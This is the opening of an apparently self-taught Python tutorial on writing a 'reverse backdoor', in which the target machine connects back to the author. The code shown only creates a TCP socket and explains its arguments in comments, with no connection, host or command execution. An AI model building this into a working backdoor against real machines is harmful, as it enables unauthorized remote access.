# coding reverse backdoor in python 
# the main function is to let the user try to connect to us instead to we trying to coonnect to user

# ------------------------------- start of code -----------------------------

import socket

# to create a socket we need to ceate an instance of it first
connetion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# this socket method takes two arguments, 1st the address family(read about it), 2nd is socket type
# in general if the connection is tcp connection then the type is sock_stream